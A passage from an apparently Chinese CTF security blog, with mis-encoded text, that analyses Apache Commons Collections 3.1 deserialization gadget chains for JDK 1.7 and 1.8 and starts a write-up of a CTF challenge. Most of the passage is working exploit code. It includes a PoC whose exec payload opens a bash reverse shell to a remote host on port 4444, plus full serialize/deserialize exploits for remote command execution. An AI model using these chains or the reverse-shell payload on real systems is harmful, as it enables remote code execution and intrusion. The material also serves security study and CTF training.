<span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Transformer[] test = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<br>                        <span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;,<br>                        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/vps/4444 0&gt;&amp;1&quot;</span>&#125;<br>                )<br>                &#125;;<br>        Transformer transformerChain =<span class="hljs-keyword">new</span> ChainedTransformer(test);<br><br>        Map tempMap = <span class="hljs-keyword">new</span> HashMap&lt;String, Object&gt;();<br>        Map&lt;String, Object&gt; exMap = TransformedMap.decorate(tempMap, <span class="hljs-keyword">null</span>, transformerChain);<br>        exMap.put(<span class="hljs-string">&quot;1111&quot;</span>, <span class="hljs-string">&quot;2222&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>è·Ÿè¿›åˆ°putå‡½æ•°æ—¶æ ˆæƒ…å†µ</p><p><img src="https://img-blog.csdnimg.cn/c831b5c2aa304e578922ba3cb01e23a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>åˆå§‹åŒ–æ—¶<code>Map&lt;String, Object&gt; exMap = TransformedMap.decorate(tempMap, null, transformerChain);</code>è¿™é‡Œ<code>this.valueTransformer</code>ä¸ä¸ºç©ºæ‰€ä»¥è¿›å…¥åˆ°<code>transform</code>å‡½æ•°        </p><p><img src="https://img-blog.csdnimg.cn/e71c8b9720f448ba8096f27e1d089a39.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¤šçº§é“¾å¤šæ¬¡è°ƒç”¨åå°„</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106223219346.png" alt="image-20211106223219346"></p><p>æœ€åä¸€æ¬¡å¾ªç¯å¾—åˆ°<code>exec</code>å‡½æ•°ï¼Œè¿™é‡Œçš„åå°„è°ƒç”¨éœ€è¦è‡ªå·±å¤šå¤šç†è§£å’Œè°ƒè¯•ä¸€ä¸‹ã€‚</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106223349029.png" alt="image-20211106223349029"></p><p>ç¬¬äºŒæ¬¡å¾ªç¯ä¼ å…¥<code>Runtime.class</code></p><p><img src="https://img-blog.csdnimg.cn/f572db9ed1e54a94bcc7f9092108bab6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/f0ef144ac0274754bdf3e836f3da6b60.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·³å‡ºç¬¬äºŒæ¬¡å¾ªç¯åè·å–åˆ°<code>Runtime.getRumtime()</code>å¯¹è±¡</p><p><img src="https://img-blog.csdnimg.cn/fd0d79fca5894c95be0a521a1c2a858c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108154318110.png" alt="image-20211108154318110"></p><p>è·³å‡ºå</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108154342143.png" alt="image-20211108154342143"></p><p>è¿›å…¥æœ€åä¸€æ¬¡å¾ªç¯</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108154438113.png" alt="image-20211108154438113"></p><p>æœ€ç»ˆåå¼¹åˆ°shell</p><p><img src="https://img-blog.csdnimg.cn/abb260c30635482bad208db339973ea6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ•´æ¡é“¾å¤šè°ƒè¯•å’Œç†è§£æ„Ÿè§‰è¿˜æ˜¯å¾ˆæ¸…æ™°å’Œé¡ºåˆ©çš„ï¼Œè¿™é‡Œç½‘ä¸Šä¼¼ä¹è¿˜æœ‰å¦ä¸€ä¸ªæ–¹æ³•ã€‚åˆ©ç”¨<code>Map.Entry</code>çš„<code>setValue</code>å‡½æ•°æ¥è§¦å‘æ¼æ´ï¼Œpocä¸»å‡½æ•°å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>        <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>        <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>&#125;;<br><br><span class="hljs-comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span><br>Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br><br><span class="hljs-comment">//åˆ›å»ºMapå¹¶ç»‘å®štransformerChina</span><br>Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br>innerMap.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;value&quot;</span>);<br><span class="hljs-comment">//ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾</span><br>Map outerMap = TransformedMap.decorate(innerMap, <span class="hljs-keyword">null</span>, transformerChain);<br><span class="hljs-comment">//è§¦å‘æ¼æ´</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br><span class="hljs-comment">//outerMapåä¸€ä¸²ä¸œè¥¿ï¼Œå…¶å®å°±æ˜¯è·å–è¿™ä¸ªmapçš„ç¬¬ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆvalue,valueï¼‰ï¼›ç„¶åè½¬åŒ–æˆMap.Entryå½¢å¼ï¼Œè¿™æ˜¯mapçš„é”®å€¼å¯¹æ•°æ®æ ¼å¼</span><br>onlyElement.setValue(<span class="hljs-string">&quot;foobar&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>å…³é”®åœ¨äºAbstracInputCheckedMapDecorator.classç±»ä¸­çš„<code>setValue</code>ä¼šè¿›å…¥åˆ°<code>TransformedMap</code>ä¸­çš„<code>checkSetValue</code>,åé¢å¤§è‡´å°±ä¸€æ ·äº†ã€‚</p><p><img src="https://img-blog.csdnimg.cn/3a829cbc792b48b682e508fccad5cc45.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211106231618609.png" alt="image-20211106231618609"></p><p>æˆ‘ä»¬å¯ä»¥è¿™é‡Œæœ‰ç»å…¸çš„åå°„æœºåˆ¶è°ƒç”¨ï¼Œåœ¨ç»†èŠ‚åˆ†æå‰æˆ‘ä»¬å…ˆæ•´ç†ä¸€ä¸‹è°ƒç”¨æ ˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Map.Entry ç±»å‹setValue(<span class="hljs-string">&quot;foobar&quot;</span>)<br>=&gt; AbstracInputCheckedMapDecorator.setValue()<br>=&gt; TransformedMap.checkSetValue()<br>=&gt; ChainedTransformer.transform(Object object)<br>    æ ¹æ®æ•°ç»„ï¼Œå…ˆè¿›å…¥ =&gt; ConstantTransformer.transform(Object input)<br>    å†è¿›å…¥ =&gt; InvokerTransformer.transform(Object input)<br></code></pre></div></td></tr></table></figure><p>è·å–execçš„åå°„è°ƒç”¨æµç¨‹ä¸º</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br>.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class)<br>.invoke(<br>Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>).invoke(Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>))<span class="hljs-comment">//æ­¤å¤„åœ¨è·å–å®ä¾‹</span><br>,<br><span class="hljs-string">&quot;calc.exe&quot;</span><br>)<br></code></pre></div></td></tr></table></figure><p>ä½†æ˜¯åˆ°è¿™é‡Œéƒ½è¿˜åªæ˜¯åœç•™åœ¨æœ¬åœ°æµ‹è¯•å‡ºäº†å‘½ä»¤æ‰§è¡Œï¼Œè¦æƒ³åœ¨ Java åº”ç”¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è§¦å‘è¯¥è¿‡ç¨‹è¿˜éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç±»ï¼Œå®ƒèƒ½å¤Ÿåœ¨ååºåˆ—åŒ–è°ƒç”¨ readObject() çš„æ—¶å€™è°ƒç”¨ TransformedMap å†…ç½®ç±» MapEntry ä¸­çš„ setValue() å‡½æ•°ï¼Œè¿™æ ·æ‰èƒ½æ„æˆä¸€æ¡å®Œæ•´çš„ Gadget è°ƒç”¨é“¾ã€‚æ°å¥½åœ¨ <code>sun.reflect.annotation.AnnotationInvocationHandler</code> ç±»å…·æœ‰ Map ç±»å‹çš„å‚æ•°ï¼Œå¹¶ä¸”åœ¨<code> readObject()</code> æ–¹æ³•ä¸­è§¦å‘äº†ä¸Šé¢æ‰€æåˆ°çš„æ‰€æœ‰æ¡ä»¶ï¼Œå…¶æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span> </span>&#123;<br>        ...çœç•¥...<br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            String name = memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                Object value = memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) || value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>å…³é”®åœ¨äº</p><p><code>memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(annotationType.members().get(name)));</code>è°ƒç”¨äº†setValueå‡½æ•°ï¼Œä½†æ˜¯è¿™æ˜¯jdk1.7çš„ç‰ˆæœ¬ï¼Œåœ¨jdk1.8ä¸­ä¾¿ä¸é€‚ç”¨</p><p>ä¹Ÿå¯ä»¥çœ‹çœ‹jdk1.8ç‰ˆæœ¬</p><p><img src="https://img-blog.csdnimg.cn/855de5736d904193835ae8bb04354f86.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="JDK1-8â€“LazyMapåˆ©ç”¨é“¾"><a href="#JDK1-8â€“LazyMapåˆ©ç”¨é“¾" class="headerlink" title="JDK1.8â€“LazyMapåˆ©ç”¨é“¾"></a>JDK1.8â€“LazyMapåˆ©ç”¨é“¾</h4><p>å¯¹äºJDK 1.8æ¥è¯´ï¼Œ<code>AnnotationInvocationHandler</code>ç±»ä¸­å…³é”®çš„è§¦å‘ç‚¹ï¼Œsetvalueå‘ç”Ÿäº†æ”¹å˜ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾æ–°çš„ç±»é‡å†™readObjectæ¥å®ç°è°ƒç”¨ï¼Œsda</p><h5 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ååºåˆ—åŒ–BadAttributeValueExpException<br>-&gt;BadAttributeValueExpException.readObject()<br>-&gt;TideMapEntry.toString()<br>-&gt;TideMapEntry.getValue()<br>-&gt;LazyMap.get()<br>-&gt;ChainedTransformer.transform()<br></code></pre></div></td></tr></table></figure><p>æœ€åä¸€ä¸ªç¯èŠ‚è‚¯å®šè¿˜æ˜¯è¦è°ƒç”¨åˆ°<code>ChainedTransformer.transform()</code>è¿™é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å…ˆçœ‹<code>LazyMap</code></p><p><img src="https://img-blog.csdnimg.cn/a5563b5b7fba4cbeaec95a5a3e34ba0c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/26d3aec379c24bde84c503834bc0db8e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¦è°ƒç”¨åˆ°getå‡½æ•°å°±æ‰¾åˆ°äº†<code>TiedMapEntry</code>ç±»</p><p><img src="https://img-blog.csdnimg.cn/6ff9788c84014b709c714bae54d1a824.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å­˜åœ¨tostring</p><p><img src="https://img-blog.csdnimg.cn/8c8bd61ba9ff47ecbf930a5f18e6d1ea.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›å¯ä»¥å‘ç°å¯åˆ©ç”¨çš„åœ°æ–¹</p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211108171802668.png" alt="image-20211108171802668"></p><p>æœ€åéœ€è¦ä¸€ä¸ªç±»å¯ä»¥åœ¨ååºåˆ—åŒ–é‡å†™readObject()æ—¶å¯ä»¥è‡ªåŠ¨è°ƒç”¨toStringæ–¹æ³•ã€‚å®Œæ•´çš„åˆ©ç”¨é“¾å°±å¯ä»¥å½¢æˆï¼Œè¿™é‡Œæ‰¾åˆ°äº†<code>BadAttributeValueExpException</code>ç±»</p><p><img src="https://img-blog.csdnimg.cn/c971cf477da244b485c05947f40c17c7.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒè¯•è¿‡jdk1.7è¿™ä¸ªå…¶å®ä¹Ÿå·®ä¸å¤šäº†ï¼Œæ²¡æœ‰é‚£ä¹ˆéš¾ç†è§£äº†ï¼Œé™„ä¸Šexp</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CC3_1.serialize;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">commons_collections_3_1_jdk1_8</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> BadAttributeValueExpException <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String command)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-keyword">final</span> String[] execArgs = <span class="hljs-keyword">new</span> String[] &#123; command &#125;;<br>        <span class="hljs-comment">// inert chain for setup</span><br>        <span class="hljs-keyword">final</span> Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                        String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                        <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                        Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                        <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                        <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, execArgs),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)&#125;;<br>        Transformer transformerChain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        <span class="hljs-keyword">final</span> Map innerMap = <span class="hljs-keyword">new</span> HashMap();<br><br>        <span class="hljs-keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);<br><br>        TiedMapEntry entry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, <span class="hljs-string">&quot;KKfine&quot;</span>);<br><br>        BadAttributeValueExpException val = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        Field valfield = val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-keyword">true</span>);<br>        valfield.set(val, entry);<br><br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        BadAttributeValueExpException calc = getObject(<span class="hljs-string">&quot;calc&quot;</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<span class="hljs-comment">//ç”¨äºå­˜æ”¾personå¯¹è±¡åºåˆ—åŒ–byteæ•°ç»„çš„è¾“å‡ºæµ</span><br><br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(calc);<span class="hljs-comment">//åºåˆ—åŒ–å¯¹è±¡</span><br>        objectOutputStream.flush();<br>        objectOutputStream.close();<br><br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="hljs-comment">//è¯»å–åºåˆ—åŒ–åçš„å¯¹è±¡byteæ•°ç»„</span><br><br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(bytes);<span class="hljs-comment">//å­˜æ”¾byteæ•°ç»„çš„è¾“å…¥æµ</span><br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        Object o = objectInputStream.readObject(); <span class="hljs-comment">//å°†byteæ•°ç»„è¾“å…¥æµååºåˆ—åŒ–</span><br><br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸œåæ¯</title>
    <link href="/2021/11/04/2021-11-%E4%B8%9C%E5%8D%8E%E6%9D%AF/"/>
    <url>/2021/11/04/2021-11-%E4%B8%9C%E5%8D%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="EzGadget"><a href="#EzGadget" class="headerlink" title="EzGadget"></a>EzGadget</h1><p>è¿™é¢˜åœ¨æˆ‘è°ƒäº†å‡ ä¸ªccåº“ä¹‹åå†çœ‹å°±å¾ˆç®€å•äº†ï¼Œå¯ä»¥çœ‹å¦ä¸€ç¯‡æ–‡ç« ã€‚</p><p>æ‰¾ä¸€ä¸ªé‡å†™readobjectå’Œtostringå¾—ç±»å°±è¡Œäº†ï¼Œè¿™é‡Œæ‰¾åˆ°<code>BadAttributeValueExpException</code>ç±»ï¼Œè¿™ä¸ªç±»å¯ä»¥è°ƒè¯•å‡ ä¸ªccé“¾å°±æ˜ç™½èƒ½ç”¨æ¥åˆ©ç”¨å•¥äº†ï¼Œå¯å‚è€ƒå¦ä¸€ç¯‡æ–‡ç« ï¼Œè¿™é‡Œå°±æ˜¯åˆ©ç”¨äº†<code>tostringbean</code>çš„defineclasså¯ä»¥è¯»å–ä»»æ„å­—èŠ‚ä»£ç ï¼Œæ‰€ä»¥å°±åªéœ€è¦å°†<code>BadAttributeValueExpException</code>ä¸­valå€¼è®¾ä¸ºToStringBeanç±»å°±è¡Œäº†</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>    ToStringBean toStringBean = <span class="hljs-keyword">new</span> ToStringBean();<br>    Class clazz = toStringBean.defineClass((String)<span class="hljs-keyword">null</span>, <span class="hljs-keyword">this</span>.ClassByte, <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.ClassByte.length);<br>    Object var3 = <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        var3 = clazz.newInstance();<br>    &#125; <span class="hljs-keyword">catch</span> (InstantiationException var5) &#123;<br>        var5.printStackTrace();<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException var6) &#123;<br>        var6.printStackTrace();<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;enjoy it.&quot;</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>expå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 